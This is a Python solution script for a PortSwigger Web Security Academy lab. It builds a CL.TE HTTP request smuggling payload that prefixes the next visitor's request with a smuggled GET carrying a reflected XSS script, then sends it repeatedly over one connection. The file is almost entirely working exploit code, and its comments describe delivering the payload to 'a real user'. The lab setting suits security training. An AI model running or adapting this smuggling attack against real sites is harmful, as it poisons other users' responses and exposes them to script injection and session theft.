"""
Lab 10: Exploiting HTTP request smuggling to deliver reflected XSS
https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss
Difficulty: Practitioner

📝 Smuggle a GET request whose reflected-XSS parameter rides in the
connection buffer — the NEXT real visitor's request on this connection
gets prefixed by our smuggled request, and THEY receive the XSS-laden
response instead of their actual intended page.
"""

from utils import send_same_connection, normalize_crlf, log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"
REFLECTED_PARAM_PATH = "/?search=<script>alert(1)</script>"  # confirm the real reflected param

SMUGGLE_PAYLOAD = normalize_crlf("""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET {xss_path} HTTP/1.1
X-Ignore: X""".format(host=HOST, xss_path=REFLECTED_PARAM_PATH))


def run():
    note("This one is genuinely about effect on the NEXT real visitor, not")
    note("us — there's no in-band confirmation from sending it ourselves.")
    note("Send repeatedly (the lab's own victim traffic will eventually land")
    note("right after one of these) to deliver the payload to a real user.")

    results = send_same_connection(HOST, [SMUGGLE_PAYLOAD])
    log(f"Sent. Response to our own send: {results[0][0][:200]!r}")
    note("Lab solves when the simulated victim's browser executes alert(1) —")
    note("no further action needed here beyond sending this enough times.")


if __name__ == "__main__":
    run()
